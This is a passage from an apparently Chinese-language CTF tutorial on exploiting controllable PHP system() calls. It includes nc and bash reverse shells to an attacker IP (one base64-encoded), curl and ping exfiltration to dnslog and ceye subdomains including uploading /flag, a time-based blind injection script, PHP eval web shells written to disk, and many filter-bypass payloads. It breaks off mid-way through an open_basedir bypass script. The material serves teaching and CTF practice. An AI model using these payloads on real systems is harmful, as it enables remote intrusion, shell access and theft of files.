id="system类命令执行">system类命令执行</h3><p>所谓system类命令执行即是原题目已经给出system函数，且其参数是可控的这种情况，下面将以php为例着重讲解该情况下的命令执行方式以及绕过姿势</p><p><strong>示例代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="无回显rce">无回显rce</h4><p>在1.3节开篇我们提到了很多可执行系统命令的函数，他们都可以达成执行系统命令的目的，但其中的一些函数会不会将执行的结果回显，例如exec函数，此时我们就需要通过某些手法得到回显，下面将对这些手法进行详细讲解</p><h5 id="反弹shell">反弹shell</h5><h6 id="vps简介"><strong>vps简介</strong></h6><p>作为一名合格的web手，一台vps是必不可少的，所谓vps就是一台具有公网ip的服务器，可从下面三方厂家获取</p><p>1.华为云：<a href="https://www.huaweicloud.com/%EF%BC%88%E4%BA%91%E8%80%80%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89">https://www.huaweicloud.com/（云耀云服务器）</a></p><p>2.腾讯云：<a href="https://cloud.tencent.com/%EF%BC%88%E8%BD%BB%E9%87%8F%E5%9E%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89">https://cloud.tencent.com/（轻量型服务器）</a></p><p>3.阿里云：<a href="https://www.aliyun.com/">https://www.aliyun.com/</a></p><p>服务器和我们个人PC电脑最大的区别就是具有公网ip，实际效果就是任意用户皆可达我们的服务器（可ping通），而个人PC电脑绝大多数情况是无法实现该功能的。详细购买流程以及产品讯息可与对应客服探讨，成功购买后即可使用ssh（服务器自带的远程连接工具）或电脑自带的远程桌面功能进行服务器登录</p><p><strong>1.ssh登录</strong></p><p>ssh软件推荐termius</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123171841669.png" alt="image-20240123171841669"></p><p>从厂家获取账号密码以及公网ip后将其填入1，2，3处，然后点击4处即可远程连接到服务器</p><p><strong>2.电脑自带远程桌面功能登录</strong>（常用于win系统）</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123172206857.png" alt="image-20240123172206857"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123172217584.png" alt="image-20240123172217584"></p><p>在此界面输入公网ip，稍后再输入厂家给予的账号密码即可登录成功</p><h6 id="反弹手法">反弹手法</h6><p><strong>1.nc反弹</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">正向连接：</span><br><span class="line">linux靶机:nc -e <span class="regexp">/bin/</span>bash -lvvnp 端口</span><br><span class="line">win靶机:nc -e cmd -lvvnp 端口     <span class="regexp">//</span>win系统不自带nc，需要手动上传，此处nc并非固定，根据实际上传的程序名做相应修改</span><br><span class="line">攻击机:nc 靶机ip 端口</span><br><span class="line"></span><br><span class="line">反向连接：</span><br><span class="line">linux靶机:nc -e <span class="regexp">/bin/</span>bash 攻击机ip 端口</span><br><span class="line">win靶机:nc -e cmd 攻击机ip 端口</span><br><span class="line">攻击机:nc -lvvnp 端口</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>上述所有操作皆是带有-lvvnp的操作（端口监听）优先</span><br></pre></td></tr></table></figure><p><strong>2.bash反弹</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击机<span class="symbol">:nc</span> -lvvnp 端口</span><br><span class="line">靶机<span class="symbol">:bash</span> -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/攻击机ip/攻击机监听的端口 0&gt;&amp;1&quot;</span></span><br><span class="line">数组版靶机（java源码）<span class="symbol">:bash</span> -c &#123;echo,<span class="title class_">YmFzaCAtaSA</span>+<span class="title class_">JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzI1MCAwPiYx</span>&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">//使用时需要对命令中的编码部分解码，将其中的ip和端口修改为攻击机ip段端口后并重新编码才可使用，浏览器传参时需要url编码</span><br></pre></td></tr></table></figure><p>示例演示</p><p>1.在靶机**可达的机器（可ping通，如公网服务器或同网段机器）**上监听端口</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123174432194.png" alt="image-20240123174432194"></p><p>2.在靶机上执行bash反弹命令</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123174611797.png" alt="image-20240123174611797"></p><p>3.查看刚刚监听端口的服务器</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123174641283.png" alt="image-20240123174641283"></p><p>可以发现反弹shell成功，此时可执行任意系统命令</p><p><strong>3.写shell文件后执行</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">创建<span class="keyword">shell</span>.<span class="keyword">sh</span></span><br><span class="line">bash -<span class="keyword">c</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/服务器ip/端口 0&gt;&amp;1&quot;</span></span><br><span class="line">将上述bash反弹命令写入文件，详见<span class="number">1.2</span>.<span class="number">3</span>节中的<span class="keyword">echo</span>用法</span><br><span class="line">./<span class="keyword">shell</span>.<span class="keyword">sh</span></span><br><span class="line">利用.执行<span class="keyword">shell</span>.<span class="keyword">sh</span>反弹<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><p><strong>正向连接与反向连接简介</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123172902417.png" alt="image-20240123172902417"></p><p>PC1、PC2、PC3为我们的目标机器，此时不难发现三台靶机都处于内网环境</p><p>正向连接：攻击机主动连接靶机</p><p>反向连接：靶机主动连接攻击机</p><p>准则：谁被动，谁监听</p><p>在上述环境中，有且仅有<strong>可访问路由</strong>、<strong>linux外网服务器</strong>、<strong>windows服务器</strong>这三个ip是可访问的，而我们的三台PC靶机此时处于内网环境，相当于我们的个人PC电脑，此时是无法访问的，我们的外网服务器最多只可致<strong>可访问路由</strong>处，即攻击机无法主动连接到靶机，所以此时就无法正向连接。由于我们外网服务器皆为<strong>公网服务器</strong>，所以三台PC靶机是可以访问到服务器的，即可以进行反向连接，让靶机主动连接攻击机，也就是我上面演示的bash反弹的操作。</p><h5 id="数据写出">数据写出</h5><p>将命令的执行结果写入其他文件，再访问其他文件获取执行结果，下以1.txt为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用<span class="built_in">cp</span>命令：<span class="built_in">cp</span> flag.php 1.txt</span><br><span class="line"></span><br><span class="line">利用<span class="built_in">mv</span>命令：<span class="built_in">mv</span> flag.php 1.txt</span><br><span class="line"></span><br><span class="line">利用&gt;输出结果到文件：<span class="built_in">ls</span> &gt; 1.txt</span><br><span class="line"></span><br><span class="line">利用<span class="built_in">tee</span>命令：<span class="built_in">ls</span> | <span class="built_in">tee</span> 1.txt    //tee会从从标准输入读取数据，并将其写入文件以及标准输出</span><br><span class="line"></span><br><span class="line">利用script命令：<span class="built_in">ls</span> | script 1.txt  //会开启命令记录，命令执行状态以及结果都将会写入文件中</span><br></pre></td></tr></table></figure><h5 id="数据外带">数据外带</h5><p>在题目环境出网的条件下，我们可以通过数据外带将命令执行的结果外带出来，此处推荐两个外带网址：</p><p>1.<a href="http://dnslog.cn">http://dnslog.cn</a></p><p>2.<a href="http://ceye.io/%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%8C%E6%9B%B4%E7%A8%B3%E5%AE%9A%EF%BC%89">http://ceye.io/（推荐，更稳定）</a></p><p>linux的数据外带归功于其反引号可执行任意系统命令这一特殊机制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">单行传输：</span><br><span class="line">ping `<span class="built_in">whoami</span>`.dns地址</span><br><span class="line">curl http://dns地址/`<span class="built_in">whoami</span>`</span><br><span class="line"></span><br><span class="line">//whoami即为我们要执行的系统命令，将其用``包裹后利用.将其与我们的dns地址进行拼接，执行命令后即可在dns处得到<span class="built_in">whoami</span>命令的回显</span><br><span class="line"></span><br><span class="line">多行传输：(外带只会显示第一行的数据)</span><br><span class="line">curl http://y91yp4.ceye.io/`<span class="built_in">ls</span> / | <span class="built_in">base64</span>`     //将结果进行<span class="built_in">base64</span>编码后外带出来</span><br><span class="line">curl http://y91yp4.ceye.io/`<span class="built_in">whoami</span> | sed -n <span class="string">&#x27;2p&#x27;</span>`    //输出固定行的结果</span><br><span class="line">curl -T /flag http://y91yp4.ceye.io/      //指定文件外带</span><br></pre></td></tr></table></figure><p>下面我会就这两个外带平台进行演示</p><p><strong>1.dnslog</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123182359664.png" alt="image-20240123182359664"></p><p>首先点击get subdomain，即可获得2所示的url地址，随后即可在靶机执行如下命令</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.dns地址</span><br><span class="line">ping `whoami`.b854kz.dnslog.cn</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123182554193.png" alt="image-20240123182554193"></p><p>点几下refresh record（点成get就得重新搞了）即可获得回显，可以得到靶机当前用户为root</p><p><strong>2.ceye</strong></p><p>平台崩了，小寄。</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123183023358.png" alt="image-20240123183023358"></p><p>login处登录后应为profile，在profile出得到url地址后即可执行如下命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//y</span>91yp4.ceye.io<span class="regexp">/`ls /</span> | base64` </span><br></pre></td></tr></table></figure><p>点几下reload即可得到回显结果</p><h5 id="盲注">盲注</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://localhost.test.php/?c=&#x27;</span></span><br><span class="line">dic=string.printable[:-<span class="number">6</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    judge=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        now=<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>a=$(cat /flag | head -1 | cut -b <span class="subst">&#123;i&#125;</span>);if [ $a = <span class="subst">&#123;j&#125;</span> ];then sleep 2;fi&#x27;</span></span><br><span class="line">        start=time.time()</span><br><span class="line">        r=requests.get(now)</span><br><span class="line">        end=time.time()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(end)-<span class="built_in">int</span>(start) &gt;<span class="number">1</span>:</span><br><span class="line">            judge=<span class="number">1</span></span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> judge==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><strong>核心命令分析</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$(<span class="built_in">cat</span> /flag | <span class="built_in">head</span> -1 | <span class="built_in">cut</span> -b &#123;i&#125;);<span class="keyword">if</span> [ <span class="variable">$a</span> = &#123;j&#125; ];<span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p><strong>第一部分</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=$(<span class="built_in">cat</span> /flag | <span class="built_in">head</span> -1 | <span class="built_in">cut</span> -b &#123;i&#125;);</span><br><span class="line">定义变量a，将<span class="built_in">cat</span> /flag的结果利用<span class="built_in">head</span> -1取第一行，利用<span class="built_in">cut</span> -b number取结果的第i（脚本中的循环i）个字符，将字符赋值给a</span><br></pre></td></tr></table></figure><p><strong>第二部分</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if <span class="selector-attr">[ $a = &#123;j&#125; ]</span>;</span><br><span class="line">判断得到的变量<span class="selector-tag">a</span>是否等于j，j为上述脚本中dic字典的遍历结果</span><br></pre></td></tr></table></figure><p><strong>第三部分</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br><span class="line">如果判断为真，则睡眠2秒，通过网页是否睡眠判断出flag的每个字母的结果</span><br></pre></td></tr></table></figure><h5 id="命令行写shell">命令行写shell</h5><p>可以通过命令执行写入shell，然后蚁剑连接，在某些情况会是一个不错的选择</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">echo &#x27;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8=&#x27; | base64 -d &gt; ./123.php  </span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">//base64解码结果为</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(\<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; /var/www/html/2.php</span></span><br></pre></td></tr></table></figure><h4 id="长度限制绕过">长度限制绕过</h4><p>示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>此题利用substr函数对eval的代码进行了限制</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">get传参   F=<span class="string">`$F `</span>; <span class="keyword">sleep</span> <span class="number">3</span></span><br><span class="line">经过<span class="keyword">substr</span>($F,<span class="number">0</span>,<span class="number">6</span>)截取后 得到  <span class="string">`$F `</span>;</span><br><span class="line">也就是会执行 <span class="keyword">eval</span>(<span class="string">&quot;`$F `;&quot;</span>);</span><br><span class="line">我们把原来的$F带进去</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;``$F `;sleep 3`&quot;</span>);</span><br><span class="line">也就是说最终会执行  <span class="string">` `</span>$F <span class="string">`;sleep 3 `</span> == shell_exec(<span class="string">&quot;`$F `; sleep 3&quot;</span>);</span><br><span class="line">前面的命令我们不需要管，但是后面的命令我们可以自由控制。</span><br><span class="line">这样就在服务器上成功执行了 <span class="keyword">sleep</span> <span class="number">3</span></span><br><span class="line">所以 最后就是一道无回显的RCE题目了，将<span class="keyword">sleep</span> <span class="number">3</span>换成我们<span class="number">2.1</span>.<span class="number">1</span>节中所讲的操作即可得到答案</span><br></pre></td></tr></table></figure><h4 id="命令绕过">命令绕过</h4><h5 id="空格">空格</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span>              </span><br><span class="line"></span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;                        <span class="literal">--</span>这里把，替换成了空格键</span><br><span class="line"></span><br><span class="line">%<span class="number">20</span>                                   <span class="literal">--</span>代表space键</span><br><span class="line"></span><br><span class="line">\x20  <span class="literal">--</span>代表space键，eval类中可用</span><br><span class="line"></span><br><span class="line">%<span class="number">09</span>           <span class="literal">--</span>需要php环境，如<span class="built_in">cat</span>%<span class="number">09</span>flag.php</span><br><span class="line"></span><br><span class="line">\x09  <span class="literal">--</span>代表space键，eval类中可用</span><br><span class="line"></span><br><span class="line"><span class="variable">$</span>&#123;IFS&#125;  <span class="literal">--</span>单纯<span class="built_in">cat</span><span class="variable">$IFS2</span>,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名，如<span class="built_in">cat</span><span class="variable">$</span>&#123;IFS2&#125;flag.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$9</span>  <span class="literal">--</span>后面加个<span class="variable">$</span>与&#123;&#125;类似，起截断作用，<span class="variable">$9</span>是当前系统shell进程第九个参数持有者，始终为空字符串，如<span class="built_in">cat</span><span class="variable">$IFS2</span><span class="variable">$9flag</span>.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;    <span class="literal">--</span>重定向，如<span class="built_in">cat</span>&lt;flag.php</span><br><span class="line"></span><br><span class="line">&lt;&gt;       <span class="literal">--</span>重定向，如<span class="built_in">cat</span>&lt;&gt;flag.php</span><br></pre></td></tr></table></figure><h5 id="字符串拼接绕过">字符串拼接绕过</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span><span class="operator">=</span>l<span class="comment">;b=s;c=/;$a$b $c</span></span><br></pre></td></tr></table></figure><p>定义变量a为l，b为s，c为/，执行命令$a$b $c即ls /</p><h5 id="base64编码绕过">base64编码绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> MTIzCg==|<span class="built_in">base64</span> -d 其将会打印123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d | bash </span><br><span class="line">`<span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d`                   ==&gt;三种结果皆为<span class="built_in">ls</span> /</span><br><span class="line"><span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d | sh</span><br></pre></td></tr></table></figure><h5 id="16进制编码绕过">16进制编码绕过</h5><p>生成脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);  <span class="comment">//6c73202f</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">6</span>c73202f | <span class="type">xxd</span> -r -p | <span class="type">bash</span></span><br><span class="line">`echo <span class="number">6</span>c73 | <span class="type">xxd</span> -r -p`</span><br><span class="line">echo `<span class="number">6</span>c73202f` | <span class="type">xxd</span> -r -p | <span class="type">sh</span> &gt; <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><h5 id="单双引号绕过">单双引号绕过</h5><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca<span class="string">&#x27;&#x27;</span>t <span class="built_in">flag</span> </span><br><span class="line">ca<span class="string">&quot;&quot;</span>t <span class="built_in">flag</span></span><br><span class="line">l<span class="string">&#x27;&#x27;</span>s /</span><br><span class="line">l<span class="string">&quot;&quot;</span>s /</span><br></pre></td></tr></table></figure><h5 id="反斜杠绕过">反斜杠绕过</h5><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l<span class="string">\s</span> /</span><br><span class="line">l<span class="string">\s</span> /<span class="keyword">var</span>/www/ht<span class="string">\ml</span></span><br><span class="line">ca<span class="string">\t</span> f<span class="string">\ag</span></span><br></pre></td></tr></table></figure><h5 id="绕过ip中的句点">绕过ip中的句点</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">网络地址可以转换成数字地址，比如<span class="number">127.0</span>.<span class="number">0.1</span>可以转化为<span class="number">2130706433</span>。</span><br><span class="line">可以直接访问http:<span class="regexp">//</span><span class="number">2130706433</span>或者http:<span class="regexp">//</span><span class="number">0</span>x7F000001，这样就可以绕过.的ip过滤。</span><br></pre></td></tr></table></figure><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">数字转ip地址</a></p><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">ip地址转数字</a></p><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">域名转数字ip</a></p><h5 id="正则匹配绕过">正则匹配绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag  =&gt;   <span class="built_in">cat</span> [e-g]lag</span><br><span class="line">   <span class="built_in">cat</span> f&#123;k..m&#125;ag</span><br></pre></td></tr></table></figure><p>两种正则匹配稍有不同：</p><p>1.[]为开区间，并<strong>不包含</strong>左右边界</p><p>2.{}为闭区间，<strong>包含</strong>左右边界</p><p>所以可得，前者只会匹配f，而后者会匹配k,l,m</p><h5 id="内敛执行法绕过">内敛执行法绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> `<span class="built_in">ls</span>`</span><br><span class="line">//获取<span class="built_in">ls</span>下的所有的文件内容</span><br></pre></td></tr></table></figure><h5 id="黑洞绕过">黑洞绕过</h5><p><strong>黑洞：</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="regexp">/dev/</span><span class="keyword">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">&gt;代表重定向，会将我们命令执行的所有结果全部丢进预定义的<span class="regexp">/dev/</span><span class="keyword">null</span>这一垃圾桶中，导致我们收不到回显</span><br></pre></td></tr></table></figure><p>利用管道符绕过,效果详见1.1节</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls || &gt;<span class="regexp">/dev/</span><span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><h5 id="绕过open-basedir">绕过open_basedir()</h5><p><strong>1.ini_set重设置绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 设置 open_basedir</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/path/to/allowed/directory:/another/allowed/directory&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以设置多个安全目录，目录和目录之间可以使用:进行分隔</p><p><strong>2.UAF脚本绕过安全目录</strong></p><p>使用时需要进行url编码再传入（bp编码）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span 